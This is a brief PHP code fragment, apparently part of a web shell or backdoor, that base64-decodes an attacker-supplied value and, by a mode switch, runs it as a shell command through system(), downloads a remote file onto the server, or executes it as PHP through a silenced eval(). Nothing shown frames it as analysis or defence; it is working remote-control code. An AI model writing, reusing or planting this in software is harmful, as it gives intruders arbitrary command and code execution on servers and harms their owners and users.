$ref[1] = base64_decode($ref[1]);
switch($ref[2]){
	case 0:
		system($ref[1]." 2>&1");
		break;
	case 1:
		$cmd = explode(' ', $ref[1]);
		echo "Byte downloaded: ".file_put_contents($cmd[1], file_get_contents($cmd[0]))."\n";
		break;
	case 2:
		@eval($ref[1]);
		break;
}
